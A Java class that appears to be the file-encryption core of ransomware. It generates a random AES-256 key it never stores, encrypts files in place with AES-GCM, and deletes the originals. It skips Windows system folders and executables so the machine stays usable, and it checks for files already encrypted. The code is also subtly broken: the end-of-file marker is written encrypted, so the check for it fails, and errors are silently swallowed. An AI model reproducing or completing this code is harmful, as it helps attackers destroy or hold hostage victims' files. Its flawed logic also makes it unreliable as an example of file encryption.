import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.RandomAccessFile;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.Arrays;

public class AESFileEncryption {

    public static final int GCM_IV_SIZE = 12;

    public static final int GCM_TAG_SIZE = 16;

    public static final String MARKER = "AES-256-GCM";
    public static SecretKeySpec generateKey(int keySize) {
        try {
            SecureRandom random = SecureRandom.getInstanceStrong();
            byte[] keyBytes = new byte[keySize / 8];
            random.nextBytes(keyBytes);
            return new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            return null;
        }
    }

    public static void encryptFile(File inputFile, SecretKeySpec key){
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");

            byte[] iv = new byte[GCM_IV_SIZE];
            SecureRandom random = new SecureRandom();
            random.nextBytes(iv);

            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_SIZE * 8, iv);

            cipher.init(Cipher.ENCRYPT_MODE, key, spec);

            File tempFile = File.createTempFile("temp", "." + key.toString().substring(0,3));
            Thread.sleep(2);
            FileOutputStream out = new FileOutputStream(tempFile);
            out.write(iv);

            CipherOutputStream cos = new CipherOutputStream(out, cipher);

            FileInputStream in = new FileInputStream(inputFile);
            byte[] buffer = new byte[8192];
            int nread;
            while ((nread = in.read(buffer)) > 0) {
                cos.write(buffer, 0, nread);
            }

            cos.write(MARKER.getBytes());

            in.close();
            cos.close();
            Files.delete(Paths.get(inputFile.getPath()));
            tempFile.renameTo(inputFile);
            Files.delete(Paths.get(tempFile.getPath()));
        }catch (Exception ignored){
        }
    }

    public static boolean canEncryptPath(File file){
        return !file.getAbsolutePath().contains("\\AppData\\Local\\Microsoft") && !file.getAbsolutePath().contains("\\AppData\\Roaming\\Microsoft") && !file.getAbsolutePath().contains("\\AppData\\LocalLow\\Microsoft");
    }

    public static boolean canEncryptFile(File file){
        return !getFileExtension(file).contains("dll") && !getFileExtension(file).contains("exe") && !file.getName().equalsIgnoreCase("desktop.ini") && !getFileExtension(file).contains("log")
                && !getFileExtension(file).contains("tmp");
    }

    public static boolean isEncrypted(File inputFile, SecretKeySpec keySpec){
        try {
            if(getFileExtension(inputFile).contains(keySpec.toString().substring(0,3)))
                return true;

            long fileSize = inputFile.length();

            if (fileSize < GCM_IV_SIZE + MARKER.length()) {
                return false;
            }

            RandomAccessFile raf = new RandomAccessFile(inputFile, "r");
            raf.seek(fileSize - MARKER.length());
            byte[] marker = new byte[MARKER.length()];
            raf.readFully(marker);
            raf.close();

            return Arrays.equals(marker, MARKER.getBytes());
        }catch (Exception e){
            return false;
        }
    }

    public static String getFileExtension(File file){
        String extension = "noneExt";
        try {
            if (file != null && file.exists()) {
                String name = file.getName();
                extension = name.substring(name.lastIndexOf("."));
            }
        } catch (Exception e) {
            extension = "noneExt";
        }
        return extension.toLowerCase();
    }
}
